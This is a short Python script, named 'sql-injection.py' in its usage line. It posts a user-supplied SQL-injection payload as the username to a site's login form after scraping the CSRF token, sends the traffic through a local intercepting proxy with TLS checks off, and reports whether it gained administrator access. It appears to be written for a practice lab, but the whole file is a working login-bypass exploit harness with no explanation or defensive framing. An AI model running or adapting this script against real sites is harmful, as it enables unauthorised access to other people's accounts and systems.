import requests
import sys
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")["value"]
    if csrf:
        return csrf
    else:
        print("Sorry couldn't find the csrf token")


def fuzz(s, url, payload):
    print("Trying payload......")
    login_url = url + '/login'
    csrf = get_csrf_token(s, login_url)

    login_data = {'csrf': csrf, 'username': payload, 'password': 'whatever'}
    r = s.post(login_url, data=login_data, verify=False, proxies=proxies)

    if 'Log out' in r.text:
        print(r.status_code)
        print("Login successful")
        print("Checking if we are administrator")
        r = s.get(url+"/my-account", verify=False, proxies=proxies)
        if 'administrator' in r.text:
            print("Successfully logged in as administrator")
        else:
            print("Failed to login as administrator")
    else:
        print("Login failed")


def main():
    if len(sys.argv) != 3:
        print('Usage: sql-injection.py <url> <payload> ')
    url = sys.argv[1]
    payload = sys.argv[2]
    s = requests.Session()
    fuzz(s, url, payload)


if __name__ == '__main__':
    main()
